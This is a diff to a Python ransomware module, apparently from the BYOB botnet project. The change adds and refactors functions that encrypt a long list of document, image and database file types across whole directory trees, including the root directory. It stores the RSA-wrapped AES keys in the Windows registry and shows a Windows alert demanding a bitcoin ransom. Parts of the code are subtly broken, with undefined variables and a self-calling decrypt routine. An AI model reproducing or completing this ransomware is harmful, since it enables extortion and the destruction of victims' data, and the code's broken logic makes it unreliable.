@@ -5,6 +5,7 @@ https://github.com/colental/byob
 Copyright (c) 2018 Daniel Vega-Myhre
 """
 from __future__ import print_function
+
 # standard library
 import os
 import sys
@@ -15,18 +16,40 @@ import pickle
 import _winreg
 import threading
 import cStringIO
-import Crypto.Util
+import collections
+import Crypto.util
 import Crypto.Hash.HMAC
 import Crypto.Cipher.AES
 import Crypto.Hash.SHA256
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
+
 # byob
 import util
 
-jobs = Queue.Queue()
+
+jobs    = Queue.Queue()
+workers = collections.OrderedDict()
+
+
+def _threader(tasks):
+    try:
+        while True:
+            try:
+                method, task = tasks.get_nowait()
+                if callable(method):
+                    method(task)
+                tasks.task_done()
+            except:
+                break
+    except Exception as e:
+        util.debug("{} error: {}".format(_threader.func_name, str(e)))
+
 
 def request_payment(bitcoin_wallet=None, payment_url=None):
+    """
+    Request ransom payment from user with a Windows alert message box
+    """
     try:
         if os.name is 'nt':
             if bitcoin_wallet:
@@ -35,67 +58,93 @@ def request_payment(bitcoin_wallet=None, payment_url=None):
                 alert = util.alert("Your personal files have been encrypted.\nThis is your Session ID: {}\nWrite it down. Click here: {}\n and follow the instructions to decrypt your files.\nEnter session ID in the 'name' field. The decryption key will be emailed to you when payment is received.\n".format(session['id'], payment_url), "Windows Alert")
             return "Launched a Windows Message Box with ransom payment information"
         else:
-            return "{} does not yet support {} platform".format(_payment.func_name, sys.platform)
+            return "{} does not yet support {} platform".format(request_payment.func_name, sys.platform)
     except Exception as e:
-        return "{} error: {}".format(_payment.func_name, str(e))
+        return "{} error: {}".format(request_payment.func_name, str(e))
+    
 
-
-def encrypt_files(args):
+def encrypt_file(path):
+    """
+    Encrypt a file
+    """
     try:
-        if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
-            aes_key = Crypto.Hash.MD5.new(Crypto.Ransom.get_random_bytes(16)).hexdigest()
-            ransom  = encrypt_file(path, key=aes_key)
-            cipher  = Crypto.Cipher.PKCS1_OAEP.new(ransom.pubkey)
-            key     = base64.b64encode(cipher.encrypt(aes_key))
-            util.registry_key(ransom, path, key)
-            util.debug('{} encrypted'.format(path))
-            if not len([k for k in workers if 'encrypt-files' in k if workers[k].is_alive()]):
-                rnd = random.randint(1,100)
-                workers['encrypt-files-{}'.format(rnd)] = threading.Thread(target=_task_threader, args=(jobs,), name=time.time())
-                workers['encrypt-files-{}'.format(rnd)].daemon = True
-                workers['encrypt-files-{}'.format(rnd)].start()
+        if not os.path.isfile(path) or not os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
+            return
+        aes_key = Crypto.Hash.MD5.new(Crypto.get_random_bytes(16)).hexdigest()
+        with open(path, 'rb') as fp:
+            plaintext = fp.read()
+        ciphertext = crypto.encrypt_aes(plaintext, key)
+        with open(path, 'wb') as fd:
+            fd.write(ciphertext)
+        cipher  = Crypto.Cipher.PKCS1_OAEP.new(publickey)
+        key     = base64.b64encode(cipher.encrypt(aes_key))
+        util.registry_key(r'SOFTWARE\BYOB', path, key)
+        util.debug('{} encrypted'.format(path))
     except Exception as e:
-        util.debug("{} error: {}".format(_encrypt.func_name, str(e)))
+        util.debug("{} error: {}".format(encrypt.func_name, str(e)))
 
 
-def decrypt_files(args):
+def decrypt_file(args):
+    """
+    Decrypt a file
+    """
     try:
         rsa_key, aes_key, path = args
         cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
         aes     = cipher.decrypt(base64.b64decode(aes_key))
-        result  = decrypt_file(path, key=aes)
+        result  = decrypt_file(path, aes)
         util.debug('%s decrypted' % result)
-        if not len([k for k in workers if 'ransom' in k if workers[k].is_alive()]):
-            rnd = random.randint(11,99)
-            workers['decrypt-files-{}'.format(rnd)] = threading.Thread(target=threader, args=(jobs,), name=time.time())
-            workers['decrypt-files-{}'.format(rnd)].daemon = True
-            workers['decrypt-files-{}'.format(rnd)].start()
     except Exception as e:
-        util.debug("{} error: {}".format(decrypt.func_name, str(e)))
+        util.debug("{} error: {}".format(decrypt_files.func_name, str(e)))
 
 
-def encrypt_threader(target):
+def encrypt_files(target, public_rsa_key):
+    """
+    Encrypt all files that are not directly required for the machine to function
+    """
     try:
-        if os.path.isfile(target):
-            return encrypt_file(target)
-        elif os.path.isdir(target):
-            workers["tree-walk"] = threading.Thread(target=os.path.walk, args=(target, lambda _, d, f: [jobs.put_nowait((encrypt_files, os.path.join(d, ff))) for ff in f], None), name=time.time())
+        if os.path.exists(str(target)):
+            if os.path.isfile(target):
+                return encrypt_file(target)
+            elif os.path.isdir(target):
+                workers["tree-walk"] = threading.Thread(target=os.path.walk, args=(target, lambda _, dirname, files: [jobs.put_nowait((encrypt_file, os.path.join(dirname, path))) for path in files], None), name=time.time())
+                workers["tree-walk"].daemon = True
+                workers["tree-walk"].start()
+                time.sleep(2)
+                for i in range(10):
+                    workers["encrypt-files-%d" % i] = threading.Thread(target=_threader, args=(jobs,), name=time.time())
+                    workers["encrypt-files-%d" % i].daemon = True
+                    workers["encrypt-files-%d" % i].start()
+                return "Encrypting files"
+        elif not _debug:
+            return encrypt_files('/')
         else:
-            return "error: {} not found".format(target)
+            return "Error: {} does not exist".format(target)
     except Exception as e:
-        util.debug("{} error: {}".format(encrypt_threader.func_name, str(e)))
+        util.debug("{} error: {}".format(encrypt_files.func_name, str(e)))
 
 
-def decrypt_threader(private_rsa_key):
+def decrypt_files(private_rsa_key):
+    """
+    Decrypt all files after ransom has been paid
+    """
     try:
-        rsa_key  = Crypto.PublicKey.RSA.importKey(private_rsa_key)
-        
-                aes_key = value.get('result')
-                jobs.put_nowait((decrypt_files, (rsa_key, aes_key, path)))
+        rsa_key = Crypto.PublicKey.RSA.importKey(private_rsa_key)
+        reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\BYOB', 0, _winreg.KEY_READ)
+        i = 0
+        while True:
+            try:
+                path, aes_key, _ = _winreg.EnumValue(r, i)
+                jobs.put_nowait((decrypt_file, (rsa_key, aes_key, path)))
+                i += 1
+            except:
+                break
         for i in range(1,10):
-            workers["ransom-%d" % i] = threading.Thread(target=_task_threader, args=(jobs,), name=time.time())
-            workers["ransom-%d" % i].daemon = True
-            workers["ransom-%d" % i].start()
-        return "Ransomed files are being decrypted"
+            workers["decrypt-files-%d" % i] = threading.Thread(target=_threader, args=(jobs,), name=time.time())
+            workers["decrypt-files-%d" % i].daemon = True
+            workers["decrypt-files-%d" % i].start()
+        return "Decrypting files"
     except Exception as e:
-        util.debug("{} error: {}".format(decrypt_threader.func_name, str(e)))
+        util.debug("{} error: {}".format(decrypt_files.func_name, str(e)))
+
+
